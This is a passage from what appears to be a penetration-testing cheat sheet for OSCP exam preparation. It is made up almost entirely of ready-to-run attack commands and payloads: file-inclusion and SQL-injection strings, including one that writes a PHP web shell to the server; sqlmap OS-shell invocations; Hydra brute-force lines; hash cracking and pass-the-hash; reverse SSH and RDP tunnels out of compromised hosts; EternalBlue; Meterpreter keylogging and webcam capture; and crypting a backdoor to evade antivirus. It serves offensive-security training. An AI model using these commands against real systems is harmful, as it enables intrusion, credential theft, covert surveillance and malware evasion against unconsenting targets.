        /var/spool/cron/crontabs/root

    -   LFI Windows Files:  
        %SYSTEMROOT%\\repair\\system  
        %SYSTEMROOT%\\repair\\SAM  
        %SYSTEMROOT%\\repair\\SAM  
        %WINDIR%\\win.ini  
        %SYSTEMDRIVE%\\boot.ini  
        %WINDIR%\\Panther\\sysprep.inf  
        %WINDIR%\\system32\\config\\AppEvent.Evt

    -   LFI OSX Files:  
        /etc/fstab  
        /etc/master.passwd  
        /etc/resolv.conf  
        /etc/sudoers  
        /etc/sysctl.conf

    -   LFI - Download passwords file  
        [*http://$ip/index.php?page=/etc/passwd*](about:blank)  
        [*http://$ip/index.php?file=../../../../etc/passwd*](about:blank)

    -   LFI - Download passwords file with filter evasion  
        [*http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd*](about:blank)

    -   Local File Inclusion - In versions of PHP below 5.3 we can
        terminate with null byte  
        GET
        /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00

    -   Contaminating Log Files `<?php echo shell_exec($_GET['cmd']);?>`

    -   For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini
        file must be configured to allow remote files
        
        */etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"  
        
        `include($_REQUEST["file"].".php");`

    -   Remote File Inclusion  
    
         `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt `
        
         `<?php echo shell\_exec("ipconfig");?>`

-   <span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities
    ----------------------------------------------------------------------------------------------------------------------

    -   Grab password hashes from a web application mysql database called “Users” - once you have the MySQL root username and        password  
    
              mysql -u root -p -h $ip
              use "Users"  
              show tables;  
              select \* from users;

    -   Authentication Bypass  
    
              name='wronguser' or 1=1;  
              name='wronguser' or 1=1 LIMIT 1;

    -   Enumerating the Database  
    
        `http://192.168.11.35/comment.php?id=738)'`  
        
        Verbose error message?  
        
        `http://$ip/comment.php?id=738 order by 1`
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6  `
        
        Determine MySQL Version:  
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6  `
        
        Current user being used for the database connection:
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6  `
        
        Enumerate database tables and column structures  
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables  `
        
        Target the users table in the database  
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where        table_name='users'  `
        
        Extract the name and password  
        
        `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users ` 
        
        Create a backdoor
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`
        

    -   **SQLMap Examples**

      - Crawl the links
      
         `sqlmap -u http://$ip --crawl=1`
         
         `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
         
         
      - SQLMap Search for databases against a suspected GET SQL Injection 
      
        `sqlmap –u http://$ip/blog/index.php?search –dbs`

      - SQLMap dump tables from database oscommerce at GET SQL injection
      
        `sqlmap –u http://$ip/blog/index.php?search= –dbs –D oscommerce –tables –dumps `
      
      - SQLMap GET Parameter command  
      
         `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5  `
          
      - SQLMap Post Username parameter
      
          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`
           
      - SQL Map OS Shell
            
          `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell  `
      
          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`
            
       - Automated sqlmap scan
       
          `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`
             
        - Targeted sqlmap scan
        
           `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`
             
         - Scan url for union + error based injection with mysql backend and use a random user agent + database dump  
         
            `sqlmap -o -u http://$ip/index.php --forms --dbs  `
               
            `sqlmap -o -u "http://$ip/form/" --forms`
                
          - Sqlmap check form for injection  
          
             `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
                 
           - Enumerate databases  
           
              `sqlmap --dbms=mysql -u "$URL" --dbs`
                
            - Enumerate tables from a specific database  
                  
              `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
                  
            - Dump table data from a specific database and table  
            
               `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
                   
            - Specify parameter to exploit  
             
               `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
                    
            - Specify parameter to exploit in 'nice' URIs (exploits param1)
             
                `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
                     
            - Get OS shell  
              
                 `sqlmap --dbms=mysql -u "$URL" --os-shell`
                       
            - Get SQL shell  
                       
                 `sqlmap --dbms=mysql -u "$URL" --sql-shell`
                        
             - SQL query  
                
                `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
                         
             - Use Tor Socks5 proxy  
                 
                `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
       
       
-   **NoSQLMap Examples**
       You may encounter NoSQL instances like MongoDB in your OSCP journies (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration. 
       
  -   NoSQLMap Installation 
       
            git clone https://github.com/codingo/NoSQLMap.git
            cd NoSQLMap/
            ls
            pip install couchdb
            pip install pbkdf2
            pip install ipcalc
            python nosqlmap.py --help 

-   Password Attacks
    --------------------------------------------------------------------------------------------------------------

    -   AES Decryption  
        http://aesencryption.net/

    -   Convert multiple webpages into a word list  
        for x in 'index' 'about' 'post' 'contact' ; do curl
        http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >>
        webapp.txt ; done

    -   Or convert html to word list dict  
        html2dic index.html.out | sort -u > index-html.dict

    -   Default Usernames and Passwords

        -   CIRT  
            [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)

        -   Government Security - Default Logins and Passwords for
            Networked Devices

        -   [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)

        -   Virus.org  
            [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)

        -   Default Password  
            [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)

    -   Brute Force

        -   Nmap Brute forcing Scripts  
            [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)

        -   Nmap Generic auto detect brute force attack  
            nmap --script brute -Pn <target.com or ip>
            <enter>

        -   MySQL nmap brute force attack  
            nmap --script=mysql-brute $ip

    -   Dictionary Files

        -   Word lists on Kali  
            cd /usr/share/wordlists

    -   Key-space Brute Force

        -   crunch 6 6 0123456789ABCDEF -o crunch1.txt

        -   crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha

        -   crunch 8 8 -t ,@@^^%%%

    -   Pwdump and Fgdump - Security Accounts Manager (SAM)

        -   pwdump.exe - attempts to extract password hashes

        -   fgdump.exe - attempts to kill local antiviruses before
            attempting to dump the password hashes and
            cached credentials.

    -   Windows Credential Editor (WCE)

        -   allows one to perform several attacks to obtain clear text
            passwords and hashes

        -   wce -w

    -   Mimikatz

        -   extract plaintexts passwords, hash, PIN code and kerberos
            tickets from memory. mimikatz can also perform
            pass-the-hash, pass-the-ticket or build Golden tickets  
            [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
            From metasploit meterpreter (must have System level access):
            `meterpreter> load mimikatz
            meterpreter> help mimikatz
            meterpreter> msv
            meterpreter> kerberos
            meterpreter> mimikatz_command -f samdump::hashes
            meterpreter> mimikatz_command -f sekurlsa::searchPasswords`

    -   Password Profiling

        -   cewl can generate a password list from a web page  
            `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

    -   Password Mutating

        -   John the ripper can mutate password lists  
            nano /etc/john/john.conf  
            `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`

    -   Medusa

        -   Medusa, initiated against an htaccess protected web
            directory  
            `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`

    -   Ncrack

        -   ncrack (from the makers of nmap) can brute force RDP  
            `ncrack -vv --user offsec -P password-file.txt rdp://$ip`

    -   Hydra

        -   Hydra brute force against SNMP  
            `hydra -P password-file.txt -v $ip snmp`

        -   Hydra FTP known user and password list  
            `hydra -t 1 -l admin -P /root/Desktop/password.lst -vV $ip ftp`

        -   Hydra SSH using list of users and passwords  
            `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`

        -   Hydra SSH using a known password and a username list  
            `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`

        -   Hydra SSH Against Known username on port 22
            `hydra $ip -s 22 ssh -l <user> -P big\_wordlist.txt`

        -   Hydra POP3 Brute Force  
            `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`

        -   Hydra SMTP Brute Force  
            `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`

        -   Hydra attack http get 401 login with a dictionary  
            `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`
            
        -   Hydra attack Windows Remote Desktop with rockyou
            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`
            
        -   Hydra brute force a Wordpress admin login
            `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

          

-   <span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks
    -------------------------------------------------------------------------------------------------------------------

    -   Online Password Cracking  
        [*https://crackstation.net/*](https://crackstation.net/)

    -   Hashcat
   Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.
apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev
and
apt-get install pocl-opencl-icd

   Cracking Linux Hashes - /etc/shadow file
   ```
   500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
   3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
   7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
   1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
   ```
   Cracking Windows Hashes
   ```
   3000 | LM                                               | Operating-Systems
   1000 | NTLM                                             | Operating-Systems
   ```
   Cracking Common Application Hashes
   ```
    900 | MD4                                              | Raw Hash
      0 | MD5                                              | Raw Hash
   5100 | Half MD5                                         | Raw Hash
    100 | SHA1                                             | Raw Hash
  10800 | SHA-384                                          | Raw Hash
   1400 | SHA-256                                          | Raw Hash
   1700 | SHA-512                                          | Raw Hash
   ```
   
   Create a .hash file with all the hashes you want to crack
   puthasheshere.hash:
   ```
   $1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/
   ```
   
   Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
   
   `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`
   
   Wordpress sample hash: $P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/
   
   Wordpress clear text: test
   
   Hashcat example cracking Wordpress passwords using rockyou:
   
  `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`

    -   Sample Hashes  
        [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)

    -   Identify Hashes  
    
        `hash-identifier`

    -   To crack linux hashes you must first unshadow them:  
    
        `unshadow passwd-file.txt shadow-file.txt  `
        `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`

-   John the Ripper - Password Hash Cracking

    -   `john $ip.pwdump`

    -   `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`

    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt`

    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

    -   JTR forced descrypt cracking with wordlist  
    
        `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`

    -   JTR forced descrypt brute force cracking  
    
        `john --format=descrypt hash --show`

-   Passing the Hash in Windows

    -   Use Metasploit to exploit one of the SMB servers in the labs.
        Dump the password hashes and attempt a pass-the-hash attack
        against another system:  
          
        `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `
          
        `pth-winexe -U administrator //$ip cmd`

<span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling
================================================================================================================================

-   Port Forwarding - accept traffic on a given IP address and port and
    redirect it to a different IP address and port

    -   `apt-get install rinetd`

    -   `cat /etc/rinetd.conf  `
        `\# bindadress bindport connectaddress connectport ` 
        `w.x.y.z 53 a.b.c.d 80`

-   SSH Local Port Forwarding: supports bi-directional communication
    channels

    -   `ssh <gateway> -L <local port to listen>:<remote
        host>:<remote port>`

-   SSH Remote Port Forwarding: Suitable for popping a remote shell on
    an internal non routable network

    -   `ssh <gateway> -R <remote port to bind>:<local
        host>:<local port>` 

-   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
    attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
    network on ANY PORT

    -   `ssh -D <local proxy port> -p <remote port>
        <target>`

-   Proxychains - Perform nmap scan within a DMZ from an external
    computer

    -   Create reverse SSH tunnel from Popped machine on :2222  
        
        `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
        `ssh -f -N -R 2222:<local host>:22 root@<remote host>`

    -   Create a Dynamic application-level port forward on 8080 thru
        2222  
        
        `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`

    -   Leverage the SSH SOCKS server to perform Nmap scan on network
        using proxy chains  
        
        `proxychains nmap --top-ports=20 -sT -Pn $ip/24`

-   HTTP Tunneling  
      
      `nc -vvn $ip 8888`

-   Traffic Encapsulation - Bypassing deep packet inspection

    -   http tunnel  
        On server side:  
        `sudo hts -F <server ip addr>:<port of your app> 80  `
        On client side:  
        `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`

-   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
    network

    -   Tunnel on port 22  
    
        `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`

    -   Port 22 blocked? Try port 80? or 443?  
    
        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`

-   Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel
    (bypass deep packet inspection)

    -   Windows machine add required firewall rules without prompting the user

    -   `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`

    -   `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`

    -   `netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080`

    -   `netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079`

    -   Start the http tunnel client  
    
         `httptunnel_client.exe`

    -   Create HTTP reverse shell by connecting to localhost port 3000  
    
        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`

-   VLAN Hopping

    -   `git clone https://github.com/nccgroup/vlan-hopping.git  
        chmod 700 frogger.sh  
        ./frogger.sh`
        

-   VPN Hacking

    -   Identify VPN servers:  
        `./udp-protocol-scanner.pl -p ike $ip`

    -   Scan a range for VPN servers:  
        `./udp-protocol-scanner.pl -p ike -f ip.txt`

    -   Use IKEForce to enumerate or dictionary attack VPN servers:  
    
        `pip install pyip`  
        
        `git clone https://github.com/SpiderLabs/ikeforce.git  `
        
        Perform IKE VPN enumeration with IKEForce:  
        
        `./ikeforce.py TARGET-IP –e –w wordlists/groupnames.dic  `
        
        Bruteforce IKE VPN using IKEForce:  
        
        `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  `
        Use ike-scan to capture the PSK hash:  
        
        `ike-scan  
        ike-scan TARGET-IP  
        ike-scan -A TARGET-IP  
        ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
        ike-scan –M –A –n example\_group -P hash-file.txt TARGET-IP  `
        Use psk-crack to crack the PSK hash  
        
        `psk-crack hash-file.txt  
        pskcrack  
        psk-crack -b 5 TARGET-IPkey  
        psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
        psk-crack -d /path/to/dictionary-file TARGET-IP-key`

-   PPTP Hacking

    -   Identifying PPTP, it listens on TCP: 1723  
        NMAP PPTP Fingerprint:  
        
        `nmap –Pn -sV -p 1723 TARGET(S)  `
        PPTP Dictionary Attack  
        
        `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`

-   Port Forwarding/Redirection

-   PuTTY Link tunnel - SSH Tunneling

    -   Forward remote port to local address:  
    
         `plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>`

-   SSH Pivoting

    -   SSH pivoting from one network to another:  
    
        `ssh -D <local host>:1010 -p 22 user@<remote host>`

-   DNS Tunneling

    -   dnscat2 supports “download” and “upload” commands for getting iles (data and programs) to and from the target machine.

    -   Attacking Machine Installation:  
    
        `apt-get update  
        apt-get -y install ruby-dev git make g++  
        gem install bundler  
        git clone https://github.com/iagox86/dnscat2.git  
        cd dnscat2/server  
        bundle install`

    -   Run dnscat2:  
    
        `ruby ./dnscat2.rb  
        dnscat2> New session established: 1422  
        dnscat2> session -i 1422`

    -   Target Machine:  
        https://downloads.skullsecurity.org/dnscat2/
        https://github.com/lukebaggett/dnscat2-powershell/  
        
        `dnscat --host <dnscat server ip>`

<span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework
======================================================================================================================

-   See [*Metasploit Unleashed
    Course*](https://www.offensive-security.com/metasploit-unleashed/)
    in the Essentials

-   Search for exploits using Metasploit GitHub framework source code:  
    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework)  
    Translate them for use on OSCP LAB or EXAM.

-   Metasploit

    -   MetaSploit requires Postfresql  
    
        `systemctl start postgresql`

    -   To enable Postgresql on startup  
    
        `systemctl enable postgresql`

-   MSF Syntax

    -   Start metasploit  
        
        `msfconsole  `
        
        `msfconsole -q`

    -   Show help for command  
    
        `show -h`

    -   Show Auxiliary modules  
    
        `show auxiliary`

    -   Use a module  
    
        `use auxiliary/scanner/snmp/snmp_enum  
        use auxiliary/scanner/http/webdav_scanner  
        use auxiliary/scanner/smb/smb_version  
        use auxiliary/scanner/ftp/ftp_login  
        use exploit/windows/pop3/seattlelab_pass`

    -   Show the basic information for a module  
    
        `info`

    -   Show the configuration parameters for a module  
    
        `show options`

    -   Set options for a module  
    
        `set RHOSTS 192.168.1.1-254  
        set THREADS 10`

    -   Run the module  
    
        `run`

    -   Execute an Exploit 
    
        `exploit`

    -   Search for a module  
    
       `search type:auxiliary login`

-   Metasploit Database Access

    -   Show all hosts discovered in the MSF database  
    
        `hosts`

    -   Scan for hosts and store them in the MSF database  
    
        `db_nmap`

    -   Search machines for specific ports in MSF database 
    
        `services -p 443`

    -   Leverage MSF database to scan SMB ports (auto-completed rhosts)  
        
        `services -p 443 --rhosts`

-   Staged and Non-staged

    -   Non-staged payload - is a payload that is sent in its entirety in one go

    -   Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus
 
 -   MS 17-010 - EternalBlue

    -   You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video:
    https://www.youtube.com/watch?v=4OHLor9VaRI
    
      
      1. First step is to configure the Kali to work with wine 32bit
      
      `dpkg --add-architecture i386 && apt-get update && apt-get install wine32
      rm -r ~/.wine
      wine cmd.exe
      exit`
            
      2. Download the exploit repostory
      https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit
      
      3. Move the exploit to /usr /share /metasploit-framework /modules /exploits /windows /smb

      4. Start metasploit console
      

I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.

      
      `use exploit/windows/smb/eternalblue_doublepulsar
      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
      RHOST => 10.11.1.73
      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
      PROCESSINJECT => spoolsv.exe
      msf exploit(eternalblue_doublepulsar) > run`
      


-   Experimenting with Meterpreter

    -   Get system information from Meterpreter Shell  
    
        `sysinfo`

    -   Get user id from Meterpreter Shell  
    
        `getuid`

    -   Search for a file  
    
        `search -f *pass*.txt`

    -   Upload a file  
    
        `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`

    -   Download a file  
    
        `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

    -   Invoke a command shell from Meterpreter Shell  
    
        `shell`

    -   Exit the meterpreter shell  
    
        `exit`

-   Metasploit Exploit Multi Handler

    -   multi/handler to accept an incoming reverse\_https\_meterpreter
    
        `payload  
        use exploit/multi/handler  
        set PAYLOAD windows/meterpreter/reverse_https  
        set LHOST $ip  
        set LPORT 443  
        exploit  
        [*] Started HTTPS reverse handler on https://$ip:443/`

-   Building Your Own MSF Module

    -   `mkdir -p ~/.msf4/modules/exploits/linux/misc  
        cd ~/.msf4/modules/exploits/linux/misc  
        cp
        /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb
        ./crossfire.rb  
        nano crossfire.rb`

-   Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)

    -   `download` Download a file or directory  
        `upload` Upload a file or directory  
        `portfwd` Forward a local port to a remote service  
        `route` View and modify the routing table  
        `keyscan_start` Start capturing keystrokes  
        `keyscan_stop` Stop capturing keystrokes  
        `screenshot` Grab a screenshot of the interactive desktop  
        `record_mic` Record audio from the default microphone for X seconds  
        `webcam_snap` Take a snapshot from the specified webcam  
        `getsystem` Attempt to elevate your privilege to that of local system.  
        `hashdump` Dumps the contents of the SAM database

-   Meterpreter Post Exploitation Features

    -   Create a Meterpreter background session  
    
        `background`

<span id="_51btodqc88s2" class="anchor"><span id="_Toc480741825" class="anchor"></span></span>Bypassing Antivirus Software 
===========================================================================================================================

-   Crypting Known Malware with Software Protectors

    -   One such open source crypter, called Hyperion  
    
        `cp /usr/share/windows-binaries/Hyperion-1.0.zip  
        unzip Hyperion-1.0.zip  
        cd Hyperion-1.0/  
        i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
        wine hyperion.exe ../backdoor.exe ../crypted.exe`


OSCP Course Review
================================================================================================================

-   Offensive Security’s PWB and OSCP — My Experience  
    [*http://www.securitysift.com/offsec-pwb-oscp/*](http://www.securitysift.com/offsec-pwb-oscp/)

-   OSCP Journey  
    [*https://scriptkidd1e.wordpress.com/oscp-journey/*](https://scriptkidd1e.wordpress.com/oscp-journey/)

-   Down with OSCP  
    [*http://ch3rn0byl.com/down-with-oscp-yea-you-know-me/*](http://ch3rn0byl.com/down-with-oscp-yea-you-know-me/)

-   Jolly Frogs - Tech Exams (Very thorough)

[*http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html*](http://www.techexams.net/forums/security-certifications/110760-oscp-jollyfrogs-tale.html)

<span id="_pxmpirqr11x0" class="anchor"><span id="_Toc480741798" class="anchor"></span></span>OSCP Inspired VMs and Walkthroughs
================================================================================================================================

-   [*https://www.vulnhub.com/*](https://www.vulnhub.com/)  
    [*https://www.root-me.org/*](https://www.root-me.org/)

-   Walk through of Tr0ll-1 - Inspired by on the Trolling found in the
    OSCP exam  
    [*https://highon.coffee/blog/tr0ll-1-walkthrough/*](https://highon.coffee/blog/tr0ll-1-walkthrough/)  
    Another walk through for Tr0ll-1  
    [*https://null-byte.wonderhowto.com/how-to/use-nmap-7-discover-vulnerabilities-launch-dos-attacks-and-more-0168788/*](https://null-byte.wonderhowto.com/how-to/use-nmap-7-discover-vulnerabilities-launch-dos-attacks-and-more-0168788/)  
    Taming the troll - walkthrough  
    [*https://leonjza.github.io/blog/2014/08/15/taming-the-troll/*](https://leonjza.github.io/blog/2014/08/15/taming-the-troll/)  
    Troll download on Vuln Hub  
    [*https://www.vulnhub.com/entry/tr0ll-1,100/*](https://www.vulnhub.com/entry/tr0ll-1,100/)

-   Sickos - Walkthrough:  
    [*https://highon.coffee/blog/sickos-1-walkthrough/*](https://highon.coffee/blog/sickos-1-walkthrough/)  
    Sickos - Inspired by Labs in OSCP  
    [*https://www.vulnhub.com/series/*](https://www.vulnhub.com/series/sickos,70/)[sickos](https://www.vulnhub.com/series/sickos,70/)[*,70/*](https://www.vulnhub.com/series/sickos,70/)

-   Lord of the Root Walk Through  
    [*https://highon.coffee/blog/lord-of-the-root-walkthrough/*](https://highon.coffee/blog/lord-of-the-root-walkthrough/)  
    Lord Of The Root: 1.0.1 - Inspired by OSCP  
    [*https://www.vulnhub.com/series/lord-of-the-root,67/*](https://www.vulnhub.com/series/lord-of-the-root,67/)

-   Tr0ll-2 Walk Through  
    [*https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/*](https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/)  
    Tr0ll-2  
    [*https://www.vulnhub.com/entry/tr0ll-2,107/*](https://www.vulnhub.com/entry/tr0ll-2,107/)

<span id="_kfwx4om2dsj4" class="anchor"><span id="_Toc480741799" class="anchor"></span></span>Cheat Sheets
==========================================================================================================

-   Penetration Tools Cheat Sheet  
    [*https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/*](https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/)

-   Pen Testing Bookmarks  
    [*https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md*](https://github.com/kurobeats/pentest-bookmarks/blob/master/BookmarksList.md)

-   OSCP Cheatsheets  
    [*https://github.com/slyth11907/Cheatsheets*](https://github.com/slyth11907/Cheatsheets)

-   CEH Cheatsheet  
    [*https://scadahacker.com/library/Documents/Cheat\_Sheets/Hacking%20-%20CEH%20Cheat%20Sheet%20Exercises.pdf*](https://scadahacker.com/library/Documents/Cheat_Sheets/Hacking%20-%20CEH%20Cheat%20Sheet%20Exercises.pdf)

-   Net Bios Scan Cheat Sheet  
    [*https://highon.coffee/blog/nbtscan-cheat-sheet/*](https://highon.coffee/blog/nbtscan-cheat-sheet/)

-   Reverse Shell Cheat Sheet  
    [*https://highon.coffee/blog/reverse-shell-cheat-sheet/*](https://highon.coffee/blog/reverse-shell-cheat-sheet/)

-   NMap Cheat Sheet  
    [*https://highon.coffee/blog/nmap-cheat-sheet/*](https://highon.coffee/blog/nmap-cheat-sheet/)

-   Linux Commands Cheat Sheet  
    [*https://highon.coffee/blog/linux-commands-cheat-sheet/*](https://highon.coffee/blog/linux-commands-cheat-sheet/)

-   Security Hardening CentO 7  
    [*https://highon.coffee/blog/security-harden-centos-7/*](https://highon.coffee/blog/security-harden-centos-7/)

-   MetaSploit Cheatsheet  
    [*https://www.sans.org/security-resources/sec560/misc\_tools\_sheet\_v1.pdf*](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

-   Google Hacking Database:  
    [*https://www.exploit-db.com/google-hacking-database/*](https://www.exploit-db.com/google-hacking-database/)

-   Windows Assembly Language Mega Primer  
    [*http://www.securitytube.net/groups?operation=view&groupId=6*](http://www.securitytube.net/groups?operation=view&groupId=6)

-   Linux Assembly Language Mega Primer  
    [*http://www.securitytube.net/groups?operation=view&groupId=5*](http://www.securitytube.net/groups?operation=view&groupId=5)

-   Metasploit Cheat Sheet  
    [*https://www.sans.org/security-resources/sec560/misc\_tools\_sheet\_v1.pdf*](https://www.sans.org/security-resources/sec560/misc_tools_sheet_v1.pdf)

-   A bit dated but most is still relevant

[*http://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html*](http://hackingandsecurity.blogspot.com/2016/04/oscp-related-notes.html)

-   NetCat

-   [*http://www.sans.org/security-resources/sec560/netcat\_cheat\_sheet\_v1.pdf*](http://www.sans.org/security-resources/sec560/netcat_cheat_sheet_v1.pdf)

-   [*http://www.secguru.com/files/cheatsheet/nessusNMAPcheatSheet.pdf*](http://www.secguru.com/files/cheatsheet/nessusNMAPcheatSheet.pdf)

-   [*http://sbdtools.googlecode.com/files/hping3\_cheatsheet\_v1.0-ENG.pdf*](http://sbdtools.googlecode.com/files/hping3_cheatsheet_v1.0-ENG.pdf)

